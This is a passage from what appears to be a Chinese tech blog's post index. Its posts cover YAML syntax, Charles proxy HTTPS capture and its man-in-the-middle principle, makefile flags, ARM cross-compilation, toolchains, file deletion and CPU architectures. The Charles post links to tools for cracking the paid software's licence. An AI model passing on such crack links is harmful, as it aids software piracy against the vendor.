}\n```\n\n\n\n多行字符串可以使用`|`保留换行符，也可以使用`>`折叠换行。\n\n```javascript\nthis: |\n  Foo\n  Bar\nthat: >\n  Foo\n  Bar\n```\n\n转为 JavaScript 代码如下。\n\n```javascript\n{ this: 'Foo\\nBar\\n', that: 'Foo Bar\\n' }\n```\n\n\n\n`+`表示保留文字块末尾的换行，`-`表示删除字符串末尾的换行。\n\n```javascript\ns1: |\n  Foo\n\ns2: |+\n  Foo\n\n\ns3: |-\n  Foo\n```\n\n转为 JavaScript 代码如下。\n\n```javascript\n{ s1: 'Foo\\n', s2: 'Foo\\n\\n\\n', s3: 'Foo' }\n```\n\n\n\n字符串之中可以插入 HTML 标记。\n\n```javascript\nmessage: |\n\n  <p style=\"color: red\">\n    段落\n  </p>\n```\n\n转为 JavaScript 如下。\n\n```javascript\n{ message: '\\n<p style=\"color: red\">\\n  段落\\n</p>\\n' }\n```\n\n\n\n#### 引用\n\n锚点`&`和别名`*`，可以用来引用。\n\n```javascript\ndefaults: &defaults\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  <<: *defaults\n\ntest:\n  database: myapp_test\n  <<: *defaults\n```\n\n等同于下面的代码。\n\n```javascript\ndefaults:\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  adapter:  postgres\n  host:     localhost\n\ntest:\n  database: myapp_test\n  adapter:  postgres\n  host:     localhost\n```\n\n`&`用来建立锚点（`defaults`），`<<`表示合并到当前数据，`*`用来引用锚点。\n\n\n\n下面是另一个例子。\n\n```javascript\n- &showell Steve \n- Clark \n- Brian \n- Oren \n- *showell \n```\n\n转为 JavaScript 代码如下。\n\n```javascript\n[ 'Steve', 'Clark', 'Brian', 'Oren', 'Steve' ]\n```\n\n\n\n## YAML实练\n\nhttp://nodeca.github.io/js-yaml/\n","tags":["yaml"],"categories":["计算机基础"]},{"title":"Charles抓包工具破解使用和Https配置","url":"%2Fp%2F2a640eb1.html","content":"\n\n\n\n### 1. Charles 软件破解\n\nhttps://github.com/8enet/Charles-Crack\n\nhttps://www.zzzmode.com/mytools/charles/\n\n发现一个更好用的抓包软件, 免费\n\nhttps://github.com/ProxymanApp/Proxyman\n\n\n\n### 2. Charles Mac Chrome抓包\n\n需要注意的是，Chrome 和 Firefox 浏览器默认并不使用系统的代理服务器设置，而 Charles 是通过将自己设置成代理服务器来完成封包截取的，所以在默认情况下无法截取 Chrome 和 Firefox 浏览器的网络通讯内容。\n\n1. 访问: chrome://settings/   \n2. 然后下拉到最后的高级，下来在“系统”（倒数第二个）的条目下找到“打开代理设置”，然后双击打开之后，打开之后找到代理的tab点开，点开之后可以看到请选择一个协议进行配置，这个时候找到“网页代理(http)”和“安全网页代理(https)”，进行相应的配置就可以了，一般来说自己不做其他处理，直接配置代理服务器为“127.0.0.1”，端口(就是冒号:)后是“8888”。\n3. 如何抓https网站, 在charles左侧该网址右键 Enable SSL Proxying\n\n<!-- more -->\n\n### 3. Charles 手机 Https抓包\n\n##### 1. 安装电脑端证书  在`Help`菜单下的路径,下载根证书,并且在`钥匙串`里设置信任此证书.\n\n![1](Charles抓包工具破解使用和Https配置/1.png)\n![2](Charles抓包工具破解使用和Https配置/2.png)\n\n\n\n##### 2. 安装手机证书\n\n![3](Charles抓包工具破解使用和Https配置/3.png)\n\n\n在相关的手机中打开`Safari`,输入下图中默认的地址`chls.pro/ssl`，手机会自动跳转到证书下载界面，按照提示安装即可.\n\n安装后,设置信任此证书.\n![4](Charles抓包工具破解使用和Https配置/4.png)\n\n\n\n##### 3. 配置手机Wifi代理和开启Charles SSL Proxy\n\n![5](Charles抓包工具破解使用和Https配置/5.png)\n![6](Charles抓包工具破解使用和Https配置/6.png)\n\n\n\n最新系统多了一道程序:\n\n+ 需要在关于本机->证书信任设置->再次信任一下证书\n\n\n\n### 4. Charles可以抓取https报文的原理\n\n原理就是: **中间人攻击**\n\n> Charles 作为一个中间人来进行 HTTPS 的代理，让我们检测到浏览器和 SSL web 服务端之间的明文通信。\n>  Charles 把自己变成一个中间人来达到这一目的。你的浏览器是收不到服务端证书的，Charles 会用自己的根证书动态签发一张证书，然后 Charles 来接受服务端的证书，你的浏览器接受 Charles 的证书。\n>  …\n>  Charles 仍然通过 SSL 与服务端进行通信，但通信是通过浏览器到 Charles，然后在从 Charles 到服务器。\n\n通俗版SSL协议原理:\n\n- 小明和小王是一对好基友，但是远隔万水千山，只能通过写信来传递消息。俩人每天的信件都是通过邮递员小红来传递的，这俩人每天纸条上明文写着信息，小红也天天看的不亦乐乎，这就是 HTTP。\n- 时间久了，两人发现不行，比如有时候会传递一些不和谐的内容，不希望小红这样的腐女看到；于是小明灵机一动，换成葬爱家族的杀马特火星文来进行通信；小王看后，心领神会。由于转换方式两人都知道，这就是对称加密技术。\n- 然而好景不长，小红勤学苦练，终于练成了火星文十级，又能看懂俩人加密的内容了。俩人必须要更换加密方式，但是更换的加密方式也只能通过小红来传递，所以这个加密的手段很难瞒住小红，这就是 HTTP 的不安全性。\n- 正好小明是一位博学的哲♂学家，他立刻写了封信给小王：把你家储物间箱子的上那把挂锁寄过来！小王看后立刻拿出了那把 82 年的挂锁，把它打开并寄给了小明。这个锁大家都能看到，但只有小王有钥匙，这就是传说中的非对称加密，锁就是公钥，小王的钥匙就是私钥。\n- 小明收到后，仔细研究了那把锁，上面烫着『隔壁老王』四个鎏金大字，正是王家祖传的锁，这就是验证服务端的数字证书。\n   于是小明放心的把新的加密方式写在信中，放到盒子里，然后用锁锁上。由于小红没有钥匙，没法查看盒子里到底写了啥，只能原样送过去。小王收到后，用自己的钥匙打开了锁，获得了新的加密方式。这就完成了 SSL 协议的握手。\n\n利用Charles之后的场景:\n\n- 小红拿到锁以后，先扣着不发，然后掏出了自己的锁寄给小明，这就是 Charles 签发了自己根证书；\n- 小明一看这把锁不是正宗王家的，但是小红家的锁，似乎也可以相信，这就是信任了 Charles 的根证书；\n- 小明把加密方式写进去，然后用小红的锁锁起来了，小红打开之后研究了加密方式，发现两人是在用水星文进行交流，瞬间水星文也达到了十级，然后在换上小王的锁锁上了盒子，还给了小王；\n- 小王毫不知情，之后俩人用水星文进行交流，但内容已经全被小红捕获到了。\n\n\n\n参考链接:\n\n+ https://blog.devtang.com/2015/11/14/charles-introduction/  Charles 从入门到精通\n+ https://www.ruanyifeng.com/blog/2014/09/illustration-ssl.html  图解SSL/TLS协议\n+ https://www.laoqingcai.com/https-mitm/ 中间人攻击","tags":["charles"],"categories":["软件"]},{"title":"makefile的选项CFLAGS、CPPFLAGS、LDFLAGS和LIBS的区别","url":"%2Fp%2F271bdf2a.html","content":"\n\n\n先看一个例子:\n\n```shell\nexport CFLAGS=\"-I/root/ARM/opt/include\"\nexport LDFLAGS=\"-L/root/ARM/opt/lib\"\n```\n\n\n\n**CFLAGS**： 指定头文件（.h文件）的路径，如：CFLAGS=-I/usr/include -I/path/include。同样地，安装一个包时会在安装路径下建立一个include目录，当安装过程中出现问题时，试着把以前安装的包的include目录加入到该变量中来。\n\n**LDFLAGS**：gcc 等编译器会用到的一些优化参数，也可以在里面指定库文件的位置。用法：LDFLAGS=-L/usr/lib -L/path/to/your/lib。每安装一个包都几乎一定的会在安装目录里建立一个lib目录。如果明明安装了某个包，而安装另一个包时，它愣是说找不到，可以抒那个包的lib路径加入的LDFALGS中试一下。\n\n**LIBS**：告诉链接器要链接哪些库文件，如LIBS = -lpthread -liconv\n\n<!-- more -->\n\n### CFLAGS,CXXFLAGS,CPPFLAGS的区别\n\nCFLAGS 表示用于 C 编译器的选项\n\nCXXFLAGS 表示用于 C++ 编译器的选项。\n\nCPPFLAGS 可以 用于 C 和 C++ 两者。\n\n\n\n### LDFLAGS,LIBS的区别\n\nLDFLAGS是选项，LIBS是要链接的库。都是喂给ld的，只不过一个是告诉ld怎么吃，一个是告诉ld要吃什么。\n\n看看如下选项：\n\n```shell\nLDFLAGS = -L/var/xxx/lib -L/opt/mysql/lib\nLIBS = -lmysqlclient -liconv\n```\n\n这就明白了。LDFLAGS告诉链接器从哪里寻找库文件，LIBS告诉链接器要链接哪些库文件。不过使用时链接阶段这两个参数都会加上，所以你即使将这两个的值互换，也没有问题。\n\n\n\n说到这里，进一步说说LDFLAGS指定-L虽然能让链接器找到库进行链接，但是运行时链接器却找不到这个库，如果要让软件运行时库文件的路径也得到扩展，那么我们需要增加这两个库给\"-Wl,R\"\n\n```\nLDFLAGS = -L/var/xxx/lib -L/opt/mysql/lib -Wl,R/var/xxx/lib -Wl,R/opt/mysql/lib\n```\n\n如 果在执行./configure以前设置环境变量export LDFLAGS=\"-L/var/xxx/lib -L/opt/mysql/lib -Wl,R/var/xxx/lib -Wl,R/opt/mysql/lib\" ，注意设置环境变量等号两边不可以有空格，而且要加上引号哦（shell的用法）。执行configure以后，Makefile将会设置这个选项， 链接时会有这个参数，编译出来的可执行程序的库文件搜索路径就得到扩展了。\n\n\n\n### 参考链接:\n\nhttps://forum.golangbridge.org/t/cflags-ldflags-documentation-somewhere/4520/10","tags":["makefile"],"categories":["系统"]},{"title":"交叉编译arm-transmission-2.94","url":"%2Fp%2F73da9612.html","content":"\n\n\n### 编译平台准备工作:\n\n1. 下载arm-none-linux-gnueabi-gcc\n\n2. 下载transmission-2.94\n\n3. 新建ARM文件夹\n\n4. 解压arm-none-linux-gnueabi-gcc和transmission-2.94到ARM文件夹\n\n5. 设置编译平台环境变量\n\n   ```shell\n   export PATH=\"/root/ARM/external-toolchain/bin:$PATH\"\n   export cross=arm-none-linux-gnueabi-\n   export CC=\"${cross}gcc\"\n   ```\n\n6. 编译的时候一定要注意看log, 是arm-none-linux-gnueabi-gcc编译的才是正确的\n\n<!-- more -->\n\n\n\n### 目标平台开始编译:\n\n#### 1. transmission\n\n```shell\n./configure --host=\"arm-none-linux-gnueabi\" --prefix=/usr/local --without-gtk --without-systemd_daemon  --disable-mac --enable-utp --disable-nls  --enable-utp --enable-lightweight --disable-cli --enable-daemon  PKG_CONFIG=\"/usr/bin/pkg-config\" PKG_CONFIG_PATH=\"/root/ARM/opt/lib/pkgconfig\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install DESTDIR=/root/ARM/transmission-2.94/a(绝对路径)\n```\n\n\n\ngit clone下来的需要执行./autogen.sh\n\n```shell\n./autogen.sh --host=\"arm-none-linux-gnueabi\" --prefix=/usr/local --without-gtk --without-systemd  --disable-mac --enable-utp --disable-nls  --enable-utp --enable-lightweight --disable-cli --enable-daemon  PKG_CONFIG=\"/usr/bin/pkg-config\" PKG_CONFIG_PATH=\"/root/ARM/opt/lib/pkgconfig\" \n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install DESTDIR=/root/transmission/a(绝对路径)\n```\n\n\n\n错误1. 出现No package 'libevent' found ->安装libevent\n\n错误2. fatal error: curl/curl.h: No such file or directory -> 安装curl\n\n错误3. rpcimpl.c:16:18: fatal error: zlib.h: No such file or directory ->安装zlib\n\n错误4. fatal error: systemd/sd-daemon.h: No such file or directory ->需要安装systemd, 此处强烈建议使用`--without-systemd_daemon`选项, 否则编译systemd又是一堆依赖\n\n\n\n#### 2. libevent\n\n```shell\nwget https://github.com/downloads/libevent/libevent/libevent-2.0.21-stable.tar.gz\ncd libevent-2.0.21-stable\n./configure --host=\"arm-none-linux-gnueabi\" --prefix=\"/root/ARM/opt/\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n#### 3. libcurl\n\n```shell\nwget https://curl.haxx.se/download/curl-7.61.1.tar.gz\ntar zxvf curl-7.61.1.tar.gz\ncd curl-7.61.1\n./configure --prefix=\"/root/ARM/opt/\" --target=arm-none-linux-gnueabi --host=arm-none-linux-gnueabi --with-zlib=\"/root/ARM/opt\" --with-ssl=\"/root/ARM/opt\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n错误1. configure: error: /root/ARM/opt is a bad --with-ssl prefix! -> 安装openssl\n\n\n\n#### 4. openssl\n\n```shell\nwget https://www.openssl.org/source/openssl-1.1.1.tar.gz\ntar zxvf openssl-1.1.1.tar.gz\ncd openssl-1.1.1\n./Configure linux-generic32 shared  -DL_ENDIAN --prefix=/root/ARM/opt --openssldir=/root/ARM/opt\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\" MAKEDEPPROG=\"${cross}gcc\" PROCESSOR=ARM\nmake install\n```\n\n\n\n#### 5. zlib\n\n```shell\nwget http://zlib.net/zlib-1.2.11.tar.gz\ntar zxvf zlib-1.2.11.tar.gz\ncd zlib-1.2.11\n./configure --prefix=\"/root/ARM/opt\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n\n\n### 目标平台执行transmission的环境变量(忽略)\n\n```shell\nexport PATH=/dev/opt/bin:$PATH\nexport LD_LIBRARY_PATH=/dev/opt/lib:$LD_LIBRARY_PATH\nexport CURL_CA_BUNDLE=/mnt/Sync2/ca.crt\nexport TR_CURL_SSL_CERT=/mnt/Sync2/cert.pem\nexport TR_CURL_SSL_CERT=/mnt/Sync2/cert.pem\nexport TR_CURL_SSL_KEY=/mnt/Sync2/key.pem\nexport STNOUPGRADE=1\n```\n\n\n\n\n\n### TODO: 编译systemd\n\n可以参考 https://wiki.beyondlogic.org/index.php?title=Cross_Compiling_SystemD_for_ARM\n\n#### 1. libkmod\n\n```shell\nwget https://www.kernel.org/pub/linux/utils/kernel/kmod/kmod-17.tar.gz\n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/ \n\nmake \nmake install \n```\n\n#### 2. libffi\n\n```shell\nwget https://sourceware.org/ftp/libffi/libffi-3.2.1.tar.gz\n./configure --prefix=/root/ARM/opt/  CC=arm-none-linux-gnueabi-gcc --host=arm-none-linux-gnueabi   \n\nmake\nmake install\n```\n\n#### 3. pcre\n\n```shell\nwget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.42.tar.gz\n./configure --prefix=/root/ARM/opt/ --host=arm-none-linux-gnueabi   CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\"\n\nmake\nmake install\n```\n\n#### 4. libattr\n\n```shell\nwget https://download-mirror.savannah.gnu.org/releases/attr/attr-2.4.48.tar.gz\n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\" \nmake install\n```\n\n#### 5. libcap\n\n```shell\nwget https://www.kernel.org/pub/linux/libs/security/linux-privs/libcap2/libcap-2.24.tar.xz \nmake prefix=/root/ARM/opt/  BUILD_CC=gcc  CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\nmake不成功修改文件:\n\n```shell\nvi libcap/cap_file.c\n\n-#ifdef VFS_CAP_U32\n+#if defined (VFS_CAP_U32) && defined (XATTR_NAME_CAPS)\n```\n\n#### 6. glibc(没有成功....)\n\n```shell\nwget http://ftp.gnome.org/pub/gnome/sources/glib/2.52/glib-2.52.3.tar.xz\n\nexport glib_cv_stack_grows=no; \\\nexport glib_cv_uscore=no; \\\nexport ac_cv_func_posix_getpwuid_r=no; \\\nexport ac_cv_func_posix_getgrgid_r=no; \\\nCFLAGS=-I/root/ARM/opt/include \\\nLDFLAGS=-L/root/ARM/opt/lib \\\n\n \n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/ --disable-libmount\n```\n\n","tags":["arm"],"categories":["BitTorrent"]},{"title":"arm交叉编译器的区别","url":"%2Fp%2Fa63b0191.html","content":"\n\n\n## 为什么要用交叉编译器？\n\n交叉编译通俗地讲就是在一种平台上编译出能运行在体系结构不同的另一种平台上的程序，比如在PC平台（X86 CPU）上编译出能运行在以ARM为内核的CPU平台上的程序，编译得到的程序在X86 CPU平台上是不能运行的，必须放到ARM CPU平台上才能运行，虽然两个平台用的都是Linux系统。\n\n交叉编译工具链是一个由编译器、连接器和解释器组成的综合开发环境，交叉编译工具链主要由binutils、gcc和glibc三个部分组成。有时出于减小 libc 库大小的考虑，也可以用别的 c 库来代替 glibc，例如 uClibc、dietlibc 和 newlib。\n\n建立交叉编译工具链是一个相当复杂的过程，如果不想自己经历复杂繁琐的编译过程，网上有一些编译好的可用的交叉编译工具链可以下载，但就以学习为目的来说读者有必要学习自己制作一个交叉编译工具链（目前来看，对于初学者没有太大必要自己交叉编译一个工具链）。\n\n<!-- more -->\n\n## 分类和说明\n\n从授权上，分为免费授权版和付费授权版。\n\n免费版目前有三大主流工具商提供，第一是GNU（提供源码，自行编译制作），第二是 Codesourcery，第三是Linora。\n\n收费版有ARM原厂提供的armcc、IAR提供的编译器等等，因为这些价格都比较昂贵，不适合学习用户使用，所以不做讲述。\n\n\n\n+ arm-none-linux-gnueabi-gcc：是 Codesourcery 公司（目前已经被Mentor收购）基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARM（32位）系统中所有环节的代码，包括裸机程序、u-boot、Linux  kernel、filesystem和App应用程序。\n\n+ arm-linux-gnueabihf-gcc：是由 Linaro 公司基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARM（32位）系统中所有环节的代码，包括裸机程序、u-boot、Linux kernel、filesystem和App应用程序。\n\n+ aarch64-linux-gnu-gcc：是由 Linaro 公司基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARMv8 64位目标中的裸机程序、u-boot、Linux  kernel、filesystem和App应用程序。\n\n+ arm-none-elf-gcc：是 Codesourcery 公司（目前已经被Mentor收购）基于GCC推出的的ARM交叉编译工具。可用于交叉编译ARM MCU（32位）芯片，如ARM7、ARM9、Cortex-M/R芯片程序。\n\n+ arm-none-eabi-gcc：是 GNU 推出的的ARM交叉编译工具。可用于交叉编译ARM MCU（32位）芯片，如ARM7、ARM9、Cortex-M/R芯片程序。\n\n\n\n## 交叉编译器下载\n\n- arm-none-linux-gnueabi-gcc下载：<http://www.veryarm.com/arm-none-linux-gnueabi-gcc>\n- arm-linux-gnueabihf-gcc下载：<http://www.veryarm.com/arm-linux-gnueabihf-gcc>\n- aarch64-linux-gnu-gcc下载：<http://www.veryarm.com/aarch64-linux-gnu-gcc>\n- arm-none-elf-gcc下载：<http://www.veryarm.com/arm-none-elf-gcc>\n- arm-none-eabi-gcc下载：<http://www.veryarm.com/arm-none-eabi-gcc>\n\n 以上地址都是直接从官网转存到百度云盘，仅为方便国内用户下载使用，并非本站制作，请勿用于商业或者非法用途。因为版本多难以选择，所以我们建议您使用该类编译器的最新版本。\n\n\n\n## 命名规则\n\n交叉编译工具链的命名规则为：`arch [-vendor][-os] [-(gnu)eabi]`\n\n- **arch** - 体系架构，如ARM，MIPS\n- **vendor** - 工具链提供商\n- **os** - 目标操作系统\n- **eabi** - 嵌入式应用二进制接口（Embedded Application Binary Interface）\n\n根据对操作系统的支持与否，ARM GCC可分为支持和不支持操作系统，如\n\n- **arm-none-eabi**：这个是没有操作系统的，自然不可能支持那些跟操作系统关系密切的函数，比如fork(2)。他使用的是newlib这个专用于嵌入式系统的C库。\n- **arm-none-linux-eabi**：用于Linux的，使用Glibc\n\n\n\n##  实例\n\n#### 1、arm-none-eabi-gcc\n\n（ARM architecture，no vendor，not target an operating system，complies with the ARM EABI）\n用于编译 ARM 架构的裸机系统（包括 ARM Linux 的 boot、kernel，不适用编译 Linux 应用 Application），一般适合 ARM7、Cortex-M 和 Cortex-R 内核的芯片使用，所以不支持那些跟操作系统关系密切的函数，比如fork(2)，他使用的是 newlib 这个专用于嵌入式系统的C库。\n\n#### 2、arm-none-linux-gnueabi-gcc  //常用的\n\n(ARM architecture, no vendor, creates binaries that run on the **Linux** operating system, and uses the GNU EABI)\n\n主要用于基于ARM架构的Linux系统，可用于编译 ARM 架构的 u-boot、Linux内核、linux应用等。arm-none-linux-gnueabi基于GCC，使用Glibc库，经过 `Codesourcery` 公司优化过推出的编译器。arm-none-linux-gnueabi-xxx 交叉编译工具的浮点运算非常优秀。一般ARM9、ARM11、Cortex-A 内核，带有 Linux 操作系统的会用到。\n\n#### 3、arm-eabi-gcc\n\nAndroid ARM 编译器。\n\n#### 4、armcc\n\nARM 公司推出的编译工具，功能和 arm-none-eabi 类似，可以编译裸机程序（u-boot、kernel），但是不能编译 Linux 应用程序。armcc一般和ARM开发工具一起，Keil MDK、ADS、RVDS和DS-5中的编译器都是armcc，所以 armcc 编译器都是收费的（爱国版除外，呵呵~~）。\n\n#### 5、arm-none-uclinuxeabi-gcc 和 arm-none-symbianelf-gcc\n\narm-none-uclinuxeabi 用于**uCLinux**，使用Glibc。\n\narm-none-symbianelf 用于**symbian**，没用过，不知道C库是什么 。\n\n\n\n## ABI 和 EABI\n\n**ABI**：二进制应用程序接口(Application Binary Interface (ABI) for the ARM Architecture)。在计算机中，应用二进制接口描述了应用程序（或者其他类型）和操作系统之间或其他应用程序的低级接口。\n\n**EABI**：嵌入式ABI。嵌入式应用二进制接口指定了文件格式、数据类型、寄存器使用、堆积组织优化和在一个嵌入式软件中的参数的标准约定。开发者使用自己的汇编语言也可以使用 EABI 作为与兼容的编译器生成的汇编语言的接口。\n\n两者主要区别是，ABI是计算机上的，EABI是嵌入式平台上（如ARM，MIPS等）。\n\n\n\n## Codesourcery公司\n\nCodesourcery推出的产品叫Sourcery G++ Lite Edition，其中基于command-line的编译器是免费的，在官网上可以下载，而其中包含的IDE和debug 工具是收费的，当然也有30天试用版本的。\n\n目前CodeSourcery已经由明导国际(Mentor Graphics)收购，所以原本的网站风格已经全部变为 Mentor 样式，但是 Sourcery G++ Lite Edition 同样可以注册后免费下载。\n\nCodesourcery一直是在做ARM目标 GCC 的开发和优化，它的ARM GCC在目前在市场上非常优秀，很多 patch 可能还没被gcc接受，所以还是应该直接用它的。\n\n而且他提供Windows下[mingw交叉编译的]和Linux下的二进制版本，比较方便；如果不是很有时间和兴趣，不建议下载 src 源码包自己编译，很麻烦，Codesourcery给的shell脚本很多时候根本没办法直接用，得自行提取关键的部分手工执行，又费精力又费时间，如果想知道细节，其实不用自己编译一遍，看看他是用什么步骤构建的即可，如果你对交叉编译器感兴趣的话。\n\n\n\n## arm-linux-gnueabi-gcc 和 arm-linux-gnueabihf-gcc\n\n两个交叉编译器分别适用于 armel 和 armhf 两个不同的架构，armel 和 armhf 这两种架构在对待浮点运算采取了不同的策略（有 fpu 的 arm 才能支持这两种浮点运算策略）。\n\n其实这两个交叉编译器只不过是 gcc 的选项 -mfloat-abi 的默认值不同。gcc 的选项 -mfloat-abi 有三种值 **soft、softfp、hard**（其中后两者都要求 arm 里有 fpu 浮点运算单元，soft 与后两者是兼容的，但 softfp 和 hard 两种模式互不兼容）：\n**soft：** 不用fpu进行浮点计算，即使有fpu浮点运算单元也不用，而是使用软件模式。\n**softfp：** armel架构（对应的编译器为 arm-linux-gnueabi-gcc ）采用的默认值，用fpu计算，但是传参数用普通寄存器传，这样中断的时候，只需要保存普通寄存器，中断负荷小，但是参数需要转换成浮点的再计算。\n**hard：** armhf架构（对应的编译器 arm-linux-gnueabihf-gcc ）采用的默认值，用fpu计算，传参数也用fpu中的浮点寄存器传，省去了转换，性能最好，但是中断负荷高。\n\n\n\n把以下测试使用的C文件内容保存成 mfloat.c：\n\n```c\n#include <stdio.h>\nint main(void)\n{\n    double a,b,c;\n    a = 23.543;\n    b = 323.234;\n    c = b/a;\n    printf(“the 13/2 = %f\\n”, c);\n    printf(“hello world !\\n”);\n    return 0;\n}\n```\n\n\n\n**1、使用 arm-linux-gnueabihf-gcc 编译，使用“-v”选项以获取更详细的信息：**\n\\# arm-linux-gnueabihf-gcc -v mfloat.c\nCOLLECT_GCC_OPTIONS=’-v’ ‘-march=armv7-a’ ‘-mfloat-abi=hard’ ‘-mfpu=vfpv3-d16′ ‘-mthumb’\n-mfloat-abi=hard\n\n可看出使用hard硬件浮点模式。\n\n**2、使用 arm-linux-gnueabi-gcc 编译：**\n\\# arm-linux-gnueabi-gcc -v mfloat.c\nCOLLECT_GCC_OPTIONS=’-v’ ‘-march=armv7-a’ ‘-mfloat-abi=softfp’ ‘-mfpu=vfpv3-d16′ ‘-mthumb’\n-mfloat-abi=softfp\n\n可看出使用softfp模式。","tags":["arm"],"categories":["系统"]},{"title":"使用管道删除不规则文件","url":"%2Fp%2Fa7ad4d37.html","content":"\n\n### 1. 使用 xargs rm \n\n```\nls | grep abcd | rm  //错误用法\n```\n\n\n\nrm doesn't accept input from `stdin`. You'll need to do something like\n\n```\nls | grep abcd | xargs rm\n```\n\n但是遇到不规则符号的文件有可能删除不了.\n\n\n\n### 2. 使用 find exec\n\n可以删除不规则符号文件:\n```\nfind . -name \"*td*\" -exec rm -f {} \\;\n```\n\n","tags":["linux"],"categories":["命令"]},{"title":"深入了解CPU架构","url":"%2Fp%2F690c18bd.html","content":"\n\n\n## CPU是什么\n\n中央处理单元（CPU）主要由运算器、控制器、寄存器三部分组成，从字面意思看运算器就是起着运算的作用，控制器就是负责发出CPU每条指令所需要的信息，寄存器就是保存运算或者指令的一些临时文件，这样可以保证更高的速度。  \n\n\n\nCPU有着处理指令、执行操作、控制时间、处理数据四大作用，打个比喻来说，CPU就像我们的大脑，帮我们完成各种各样的生理活动。因此如果没有CPU，那么电脑就是一堆废物，无法工作。移动设备其实很复杂，这些CPU需要执行数以百万计的指示，才能使它向我们期待的方向运行，而CPU的速度和功率效率是至关重要的。速度影响用户体验，而效率影响电池寿命。最完美的移动设备是高性能和低功耗相结合。 \n\n\n\n## CPU的架构\n\n从CPU发明到现在，有非常多种架构，从我们熟悉的X86，ARM，到不太熟悉的MIPS，IA64，它们之间的差距都非常大。但是如果从最基本的逻辑角度来分类的话，它们可以被分为两大类，即所谓的“复杂指令集”与“精简指令集”系统，也就是经常看到的“CISC”与“RISC”。\n\n\n\n Intel和ARM处理器的第一个区别是，前者使用复杂指令集（CISC)，而后者使用精简指令集（RISC）。属于这两种类中的各种架构之间最大的区别，在于它们的设计者考虑问题方式的不同。\n\n\n\n我们可以继续举个例子，比如说我们要命令一个人吃饭，那么我们应该怎么命令呢？我们可以直接对他下达“吃饭”的命令，也可以命令他“先拿勺子，然后舀起一勺饭，然后张嘴，然后送到嘴里，最后咽下去”。从这里可以看到，对于命令别人做事这样一件事情，不同的人有不同的理解，有人认为，如果我首先给接受命令的人以足够的训练，让他掌握各种复杂技能（即在硬件中实现对应的复杂功能），那么以后就可以用非常简单的命令让他去做很复杂的事情——比如只要说一句“吃饭”，他就会吃饭。但是也有人认为这样会让事情变的太复杂，毕竟接受命令的人要做的事情很复杂，如果你这时候想让他吃菜怎么办？难道继续训练他吃菜的方法？我们为什么不可以把事情分为许多非常基本的步骤，这样只需要接受命令的人懂得很少的基本技能，就可以完成同样的工作，无非是下达命令的人稍微累一点——比如现在我要他吃菜，只需要把刚刚吃饭命令里的“舀起一勺饭”改成“舀起一勺菜”，问题就解决了，多么简单。这就是“复杂指令集”和“精简指令集”的逻辑区别。\n\n<!-- more -->\n\n\n\n## CPU常见架构\n\n##### X86\n\n978年6月8日，Intel发布了史诗级的CPU处理器8086，由此X86架构传奇正式拉开帷幕。首次为8086引入X86作为计算机语言的指令集，定义了一些基本使用规则，X86架构使用的是CISC复杂指令集。同时8086处理器的大获成功也直接让Intel成为了CPU巨头.\n\n##### IA64（Intel Architecture 64，英特尔架构64）\n\n哇，IA64听起来好陌生，是的，虽然同出Intel之手。但这可以说是失败品。当年X86过渡到64位指令集时，一个不小心被AMD弯道超车，最后只能联合惠普推出了属于自己的IA64指令集，但这也仅限于服务器上，也是Itanium安腾处理器的来历（现在已经凉了）\n\n至于IA64究竟是RISC还是CISC指令集的延续，这个真的很难说清楚，但单纯以IA64基于HP的EPIC（Explicitly Parallel Instruction Computers，精确并行指令计算机）来看，似乎更偏向于RISC体系。\n\n##### MIPS（Microprocessor without interlockedpipedstages，无内部互锁流水级的微处理器）\n\n在上世纪80年代由美国斯坦福大学Hennessy教授的研究小组研发，它采用精简指令系统计算结构(RISC)来设计芯片。和Intel采用的复杂指令系统计算结构(CISC)相比，RISC具有设计更简单、设计周期更短等优点，并可以应用更多先进的技术，开发更快的下一代处理器。\n\nMIPS是出现最早的商业RISC架构芯片之一，新的架构集成了所有原来MIPS指令集，并增加了许多更强大的功能。MIPS自己只进行CPU的设计，之后把设计方案授权给客户，使得客户能够制造出高性能的CPU。\n\n让MIPS出名的，可能是在2007年，中科院计算机研究所的龙芯处理器获得了MIPS的全部专利、指令集授权，中国开始走上了一MIPS为基础的CPU研发道路。\n\n##### PowerPC\n\nPowerPC是有蓝色巨人IBM联合苹果(早期mac用的就是这个)、摩托罗拉公司研发的一种基于RISC精简指令集的CPU，PowerPC架构最大优点是灵活性非常好，核心数目灵活可变，因此在嵌入式设备上具有很高效益，可以针对服务器市场做超多核，针对掌机做双核，因此它具有优异的性能、较低的能量损耗以及较低的散热量。\n\n##### ARM（Advanced RISC 